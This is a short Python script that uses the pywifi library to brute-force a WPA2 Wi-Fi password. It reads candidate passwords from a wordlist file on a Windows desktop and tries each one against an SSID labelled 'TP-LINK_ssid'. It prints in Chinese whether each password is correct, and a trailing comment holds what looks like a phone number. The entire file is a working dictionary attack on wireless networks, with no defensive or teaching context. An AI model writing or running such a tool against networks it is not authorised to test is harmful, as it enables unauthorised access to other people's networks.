
import pywifi
import time
from pywifi import const

def wifi_connect(ssid, pwd):
  wifi = pywifi.PyWiFi() 
  iface = wifi.interfaces()[0]

  iface.disconnect()
  time.sleep(1)

  if iface.status() == const.IFACE_DISCONNECTED:
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.key = pwd  
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)        

    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)
    iface.connect(tmp_profile) 
    time.sleep(5)

    if iface.status() == const.IFACE_CONNECTED:
      return True
  return False

with open('C:\\Users\\Administrator\\Desktop\\iphone.txt','r') as f:
  pwd_list = f.readlines()

for pwd in pwd_list:
  pwd = pwd.strip() 
  if wifi_connect('TP-LINK_ssid', pwd):
    print('密码正确:', pwd)
    break
  else:
    print('密码错误:', pwd)  

print('连接测试完成')

# 13792312650